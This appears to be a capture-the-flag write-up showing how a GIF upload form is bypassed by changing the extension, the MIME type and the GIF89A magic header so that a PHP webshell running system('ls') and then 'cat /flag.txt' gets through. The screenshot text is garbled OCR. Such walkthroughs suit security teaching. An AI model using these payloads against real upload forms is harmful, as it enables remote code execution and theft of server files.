# gif
> I made a secure php web app where I can upload all my gifs. Some people on the internet told me to run it in a docker container just to protect it from my personal files, but who cares.

## About the Challenge
We were given a plain website that has the functionality to upload a GIF file.


[Image extracted text: 213.133.103.186.5102/
213.133.103.186.5102
Getting Started
#519502 Name Link B.
#927384 Race Conditi__
#502
Upload a GIF
Filename:
Browse ._
No file selected:
Upload]


## How to Solve?
The first thing I want to test is `Unrestricted File Upload` vulnerability where we can upload malicious file such as PHP file


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[upload-php
HTTP/1.1
HTTP/1-1
200
OK
Host
213
133.
103
186 : 5102
Date:
Sun ,
Lpr
2023
16:31:00
GIT
User-Agent
Hozilla/5
(Vindous
IT
10
Vin64;
{64;
rv:109
Gecko/:O1OO101
Server:
Apache / 2
4 .54
(Debian)
Fire
111
X-Povered-By:
PHP / 8
Accept
Vary: Accept
Encoding
ext /htul
applicat
on / xhcultxul
application/xnl
4F-0
9 , image/ avif ,inage /vebp ,* /*;4F-0
Content
Length:
110
Aecept -
aguage
en-US
en;4-0
Connect
on :
close
Accept
Encoding:
gzip
deflace
Content
Type:
texc
/htnl ;
charset-UTF-8
Content-
Type
nultipart / forn-data;
boundary
--1-7594093716841650474122803430
<htnl>
Content
Lengch:
482
11
<hody>
Origin:
http: / /213.
133
103 ,
186: 5102
<h3>
Connect
on :
close
File
Upload
Stacs:
Referer:
http
1/213
133
103
186: 5102/
<fh3z
12 Upgrade
Ins
cure-Requests:
Please upload
GIF
file
</body>
127594093716841650474122803430
/heml>
Content-Disposit
on:
forn-daca;
I- =
name
cest
php
127594093716841650474122803430
Content
Disposition:
form-
data;
nane
file
filename
test
php
20 Cont
Type
applicat
on /php
<?php
system
1s)
127594093716841650474122803430
24 Content-Disposition:
form-
daca;
an =
subnit
Upload
127594093716841650474122803430-
fox
enc]


At first I tried to upload a PHP file but the server wants us to upload GIF file. So I tried to change the extension file and the MIME type


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[upload php HTTP/1.1
HTTP / 1
200
OF
Host
213
133
103
186: 5102
Date:
Sun ,
Apr
2023
16:32:17
GHT
User-Agent
Hozilla/ 5
(Vindous
IT
10.0;
Vin64;
{64;
17:109
Geclo/:O100101
Server:
Apache/ 2
(Debial
Firefor/1ll
X-Povered-By:
PHP / 8
Aecept
Vary:
Aecept
Encoding
cext / html
application/ xhchltxnl , applicat
on/ <ul
F0
image / avif
1nage /vebp
1*{9=0
Content
engch:
110
Accept-Language
en-US
en;
Connect
on =
close
Lecept-Encoding:
gzip ,
deflace
Content
Type
text /htul
charset-UTF-8
Content-Type
nultipart
form-
daca;
boudary=
-127594093716841650474122803430
<hcnl
Content-
Lengch:
476
<body>
Origin:
http
1/213
133
103_
186: 5103
<h3>
Connect
on:
close
File
Upload Stacs:
Re ferer: http
1/213
133
103.186
5102/
<fh3z
Upgrade
Ins
cue-
Requests:
Please upload
GIF
fil-
</bodyz
127594093716841650474122803430
/henl>
Content
osit
on:
form-daca;
nae
name
cest -php
127594093716841650474122803430
Content
osition:
form
data;
nae
file-
filename
est
gif
Content-
Type
1mage
Jif
4?php systen
15)
127594093716841650474122803430
Content-Disposit
on:
form-
data;
nae
stbnit
Upload
127594093716841650474122803430-
Seorch;
matches
Seorcn;
matches
4-0
Disp
Dispe]


The server still rejects our request. Now, I am trying to add the GIF magic header. (You can check another file's magic header [here](https://en.wikipedia.org/wiki/List_of_file_signatures))


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[upload-php
HTTP /1.1
HTTP/1-1
200
OK
Host
213
133.
103
186- 5103
Date:
Sun ,
Lpr
2023 16;34:46
GIIT
User-Agent
Hozilla/5
(Vindous
IT   10
Vin64;
*64;
rv:109
Gecko/:O1OO101
Server
Apache/ 2
4 .54
(Debian)
Fire
(111
X-Povered-By:
PHP / 8 - _
Accept
Vary: Accept
Encoding
ext /htul
applicat
on / xhcultxul
application/xnl
4F-0
9 , image/ avif,inage/vebp ,* /*;4-0
Content
Length:
109
Aecept -
aguage
en-US
en;[-0_
Connect
on :
close
Accept
Encoding:
gzip
deflace
Content
Type
texc
/htnl;
charset-UTF-8
Content-
Type
hultipart
form-data;
boundary
--1-7594093716841650474122803430
<htnl>
Content
Lengch:
484
<hody>
Origin: http: / /213
133
103 ,
186 : 5102
<h3>
Connect
on :
close
File
Upload
Stacs:
Referer:
http
1/-13.133
103.186: 5102/
<fh3z
ade
Ins
cure-Requests:
File
has
been
up loadedi
~(body>
127594093716841650474122803430
/heml>
Content-Disp
sition:
form-
data;
I- =
name
cest
php
127594093716841650474122803430
Content
Disposition:
form-
data;
nane
file
filenane
test
Gi f"
20 Content-Type
image
GIF89A ;
K?php
system
1s )
127594093716841650474122803430
24 Content-Disposition:
form-daca;
an =
subnit
Upload
127594093716841650474122803430-
Seorcni
matches
Seorcne
matches
fox
Upgr =]


Yay success, now access the uploaded file on `uploads` endpoint. To obtain the flag, try to upload below code into the server

```php
GIF89A; <?php system("cat /flag.txt"); ?>
```


[Image extracted text: 7
view-source:http://213.133.103.186.5102/uploads/testphp
Getting Started
#519502 Name Link B _
#927384 Race Conditi_.
#502758 RCE and Co_
Exploit Database
GIF89A;
bucket{1_h4t3_PHP}]


```
bucket{1_h4t3_PHP}
```